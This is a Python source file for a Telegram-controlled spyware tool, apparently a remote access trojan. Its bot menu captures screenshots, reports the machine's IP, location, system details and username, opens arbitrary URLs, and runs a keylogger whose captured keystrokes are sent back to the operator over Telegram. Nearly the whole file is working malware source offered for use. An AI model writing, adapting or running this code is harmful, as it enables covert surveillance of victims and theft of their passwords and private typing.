import pyautogui
import telebot
import os
import requests
import platform
import getpass
import webbrowser
import tkinter as tk
import threading
from pynput import keyboard
from telebot import types


#   ___  _ __   ___   __ _ | |_   ___   _ __        | |__   _ __  __  __
#  / __|| '__| / _ \ / _` || __| / _ \ | '__|       | '_ \ | '_ \ \ \/ /
# | (__ | |   |  __/| (_| || |_ | (_) || |          | | | || |_) | >  < 
#  \___||_|    \___| \__,_| \__| \___/ |_|    _____ |_| |_|| .__/ /_/\_\
    

TOKEN = "YOUR TOKEN"
bot = telebot.TeleBot(TOKEN)

keys_pressed = []


def key_pressed(key):
    global keys_pressed
    try:
        keys_pressed.append(key.char if key.char is not None else str(key))
    except AttributeError:
        keys_pressed.append(str(key))


# Start keyboard listener
def start_keylogger():
    listener = keyboard.Listener(on_press=key_pressed)
    listener.start()


# Create a screenshot of the screen
def make_screenshot():
    if not os.path.exists("screenshot"):
        os.makedirs("screenshot")
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot/screenshot.png")


# Get user's IP address and location
def get_ip_and_location():
    response = requests.get('https://ipinfo.io')
    data = response.json()
    ip_address = data.get("ip")
    city = data.get("city")
    region = data.get("region")
    country = data.get("country")
    return ip_address, city, region, country


# Get information about user's computer
def get_computer_info():
    system = platform.system()
    node = platform.node()
    release = platform.release()
    version = platform.version()
    machine = platform.machine()
    processor = platform.processor()
    username = getpass.getuser()
    return system, node, release, version, machine, processor, username


# Open any website based on user input
def open_any_site_function(message):
    url = message.text
    try:
        webbrowser.open(url)
        bot.send_message(message.chat.id, "The website has been opened successfully!")
    except Exception as e:
        bot.send_message(message.chat.id, f"ERROR⛔️\nTry Again: {e}")

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    btn1 = types.KeyboardButton("📸 Take Screenshot")
    btn2 = types.KeyboardButton("🌍 Get IP Address")
    btn3 = types.KeyboardButton("💻 PC Information")
    btn4 = types.KeyboardButton("🔗 Open Website")
    btn5 = types.KeyboardButton("🔑 Start Keylogger")
    btn6 = types.KeyboardButton("🗝 Show Keystrokes")
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6)
    
    welcome_text = (
        
        "<b>Please select an option from the menu below🎯</b>"
    )
    
    gif_url = 'https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMmNsbXlnM2Q0dWFkdXcweXhjejF4amd3ZDR2eXhtd2s2aWkyZjU4eSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/qQRfz2VfUbDeebczif/giphy.gif'  # Укажите URL GIF

    bot.send_animation(message.chat.id, gif_url, caption=welcome_text, parse_mode='HTML', reply_markup=markup)
    

@bot.message_handler(func=lambda message: message.text == "📸 Take Screenshot")
def handle_screenshot_button(message):
    make_screenshot()
    image_path = "screenshot/screenshot.png"
    if os.path.exists(image_path):
        with open(image_path, 'rb') as screenshot:
            bot.send_photo(message.chat.id, screenshot)
        os.remove(image_path)
    else:
        bot.send_message(message.chat.id, "ERROR⛔️\nTry Again")

@bot.message_handler(func=lambda message: message.text == "🌍 Get IP Address")
def handle_ip_button(message):
    ip, city, region, country = get_ip_and_location()
    try:
        bot.send_message(
            message.chat.id,
            f"<b>IP Address:</b> {ip}\n"
            f"<b>City:</b> {city}\n"
            f"<b>Region:</b> {region}\n"
            f"<b>Country:</b> {country}\n",
            parse_mode='HTML'
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"ERROR⛔️ - {e} -\nTry Again")

@bot.message_handler(func=lambda message: message.text == "💻 PC Information")
def handle_computer_info_button(message):
    system, node, release, version, machine, processor, username = get_computer_info()
    try:
        bot.send_message(
            message.chat.id,
            f"<b>System:</b> {system}\n"
            f"<b>Node:</b> {node}\n"
            f"<b>Release:</b> {release}\n"
            f"<b>Version:</b> {version}\n"
            f"<b>Machine:</b> {machine}\n"
            f"<b>Processor:</b> {processor}\n"
            f"<b>Username:</b> {username}\n",
            parse_mode='HTML'
        )
    except Exception as e:
        bot.send_message(message.chat.id, f"ERROR⛔️ - {e} -\nTry Again")

@bot.message_handler(func=lambda message: message.text == "🔗 Open Website")
def handle_open_any_site_button(message):
    bot.send_message(message.chat.id, "Please enter the website URL:") 
    bot.register_next_step_handler(message, open_any_site_function)

@bot.message_handler(func=lambda message: message.text == "🔑 Start Keylogger")
def handle_start_keylogger_button(message):
    start_keylogger()
    bot.send_message(message.chat.id, "Keylogger has been started.")


@bot.message_handler(func=lambda message: message.text == "🗝 Show Keystrokes")
def handle_show_keys_button(message):
    bot.send_message(message.chat.id, ''.join(keys_pressed))
    
def run_bot():
    bot.polling(none_stop=True)

def run_gui():
    root = tk.Tk()  

    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    window_width = 400  
    window_height = 300  

    x = (screen_width - window_width) // 2
    y = (screen_height - window_height) // 2

    root.geometry(f"{window_width}x{window_height}+{x}+{y}")

    def update_gui():
        root.after(1000, update_gui)  

    update_gui() 

    root.mainloop()

if __name__ == "__main__":
    bot_thread = threading.Thread(target=run_bot)
    bot_thread.start()

    run_gui()
